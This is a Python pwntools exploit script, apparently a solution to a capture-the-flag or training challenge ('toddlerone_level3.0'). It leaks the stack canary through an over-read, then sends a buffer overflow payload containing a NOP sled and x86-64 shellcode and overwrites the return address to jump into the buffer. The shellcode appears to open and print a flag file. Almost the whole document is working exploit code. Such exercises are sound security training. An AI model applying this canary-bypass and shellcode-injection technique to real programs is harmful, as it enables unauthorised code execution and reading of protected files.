from pwn import *

# initialization
context.arch = 'amd64'
context.endian = 'little'
elf = ELF("/challenge/toddlerone_level3.0")
io = elf.process()

# Vars
distance_canary = 16 #0x10
distance_buffer = 72 #0x48
distance_between_buffer_and_canary = distance_buffer - distance_canary

# Leak the canary
io.recvuntil("size:")
io.sendline(str(distance_between_buffer_and_canary + 1))

io.recvuntil("bytes)!")

payload_first_run = b'A' * (distance_between_buffer_and_canary - 6) + b'REPEAT' + b'B'
io.sendline(payload_first_run)

io.recvuntil(b'REPEATB')
canary = b'\x00' + io.recvline().strip()[:7]
print("Canary: " + str(bytes(canary)))

# Exploit
io.readuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)

io.recvuntil("size:")
io.sendline(str(distance_buffer + 8))


shellcode =  b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
print("Shellcode length: " + str(len(shellcode)))
payload_second_run = b"\x90"*3 + shellcode + canary + b"\x90"*8 + p64(buffer_addr)

io.recvuntil("bytes)!")
io.sendline(payload_second_run)
io.interactive()